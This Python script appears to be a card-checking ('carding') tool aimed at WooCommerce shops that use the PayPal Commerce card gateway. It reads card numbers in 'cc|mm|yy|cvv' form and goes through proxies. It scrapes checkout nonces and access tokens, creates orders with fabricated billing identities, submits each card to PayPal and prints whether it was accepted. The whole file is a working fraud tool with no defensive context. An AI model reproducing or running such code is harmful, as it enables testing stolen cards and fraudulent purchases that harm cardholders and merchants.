from urllib.parse import urlparse
import base64
import requests
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def ppcp_api(url, creditCard, proxy):
    cc, mm, yy, cvv = creditCard.strip().split('|')
    domain = urlparse(url).hostname
    session = requests.Session()

    #requests 1
    try:
        response = session.get(url, proxies=proxy)

        id_match = re.search(r'/wp-json/wp/v2/product/([^"]+)"', response.text)
        if not id_match:
            return print(f"{cc}|{mm}|{yy}|{cvv} Product ID not found in the response.")
        id = id_match.group(1)

    except Exception as e:
        return print(f"requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'{cc}|{mm}|{yy}|{cvv} Failed to add item to cart.')

    except Exception as e:
        return print(f"requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
        if not nonce_match:
            return print(f"{cc}|{mm}|{yy}|{cvv} Checkout nonce not found in the response.")
        checkoutNonce = nonce_match.group(1)
        
        PayPalCommerceGateway_match = re.search(r'var PayPalCommerceGateway = ([^;]+);', response.text)
        if not PayPalCommerceGateway_match:
            return print(f"{cc}|{mm}|{yy}|{cvv} PayPalCommerceGateway variable not found in the response.")
        PayPalCommerceGateway = PayPalCommerceGateway_match.group(1)

        clientNonce = json.loads(PayPalCommerceGateway)["data_client_id"]["nonce"]
        orderNonce = json.loads(PayPalCommerceGateway)["ajax"]["create_order"]["nonce"]
        approveNonce = json.loads(PayPalCommerceGateway)["ajax"]["approve_order"]["nonce"]

    except Exception as e:
        return print(f"requests 3 An error occurred during processing: {e}")

    #requests 4
    try:
        url = f"https://{domain}/?wc-ajax=ppc-data-client-id"
        data = {
            "nonce": clientNonce 
        }
        response = session.post(url, json=data, proxies=proxy)

        accessToken = re.search(r'"accessToken":"([^"]+)"', base64.b64decode(response.json().get("token")).decode('utf-8')).group(1)

    except Exception as e:
        return print(f"requests 4 An error occurred during processing: {e}")

     #requests 5
    try:
        url = f"https://{domain}/?wc-ajax=ppc-create-order"
        data = {
            'nonce': orderNonce,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': "0",
            'payment_method': 'ppcp-credit-card-gateway',
            'form': {
                'billing_first_name': 'Danyka',
                'billing_last_name': 'Kunde',
                'billing_country': 'US',
                'billing_address_1': '90154 Alanna Rapid Suite 080',
                'billing_city': 'New York',
                'billing_state': 'NY',
                'billing_postcode': '10080',
                'billing_phone': '5809662076',
                'billing_email': 'DanykaKunde@gmail.com',
                'shipping_country': 'PH',
                'shipping_method[0]': 'flexible_shipping_ups:2:03',
                'payment_method': 'ppcp-credit-card-gateway',
                'woocommerce-process-checkout-nonce': checkoutNonce,
                '_wp_http_referer': '/?wc-ajax=update_order_review',
            },
            'createaccount': False
        }
        response = session.post(url, json=data, proxies=proxy)

        if 'errors' in response.text:
            return print(f"{cc}|{mm}|{yy}|{cvv} No shipping method has been selected. Please double check your address, or contact us if you need any help.")
        elif 'success' in response.text:
            tokenID = json.loads(response.text)["data"]["id"]
            try:
                customID = json.loads(response.text)["data"]["custom_id"]
            except KeyError:
                customID = "undefined"

    except Exception as e:
        return print(f"requests 5 An error occurred during processing: {e}")

     #requests 6
    try:
        url = f"https://cors.api.paypal.com/v2/checkout/orders/{tokenID}/confirm-payment-source"
        data = {
            "payment_source": {
                "card": {
                    "number": cc,
                    "expiry": "-".join([yy, mm])
                }
            }
        }
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {accessToken}",
            "Braintree-Sdk-Version": "3.32.0-payments-sdk-dev",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        }
        response = session.post(url, json=data, headers=headers, proxies=proxy)

        if response.status_code == 422:
            return print(f'{cc}|{mm}|{yy}|{cvv} The requested action could not be performed, semantically incorrect, or failed business validation.')

    except Exception as e:
        return print(f"requests 6 An error occurred during processing: {e}")
    
    #requests 7
    try:
        url = f"https://{domain}/?wc-ajax=ppc-approve-order"
        data = {
            "nonce": approveNonce,
            "order_id": tokenID
        }
        response = session.post(url, json=data, proxies=proxy)

    except Exception as e:
        return print(f"requests 7 An error occurred during processing: {e}")
    
    #requests 8
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '5809662076',
            'billing_email': 'DanykaKunde@gmail.com',
            'shipping_country': 'PH',
            'shipping_method[0]': 'flexible_shipping_ups:2:03',
            'payment_method': 'ppcp-credit-card-gateway',
            'woocommerce-process-checkout-nonce': checkoutNonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
            'ppcp-resume-order': customID
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'success' in status:
            receipt = stripTags(json.loads(response.text)["redirect"])
            return print(f"{cc}|{mm}|{yy}|{cvv} {receipt}")
        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"{cc}|{mm}|{yy}|{cvv} {message}")
        else:
            return print(f"{cc}|{mm}|{yy}|{cvv} {response.text}")

    except Exception as e:
        return print(f"requests 8 An error occurred during processing: {e}")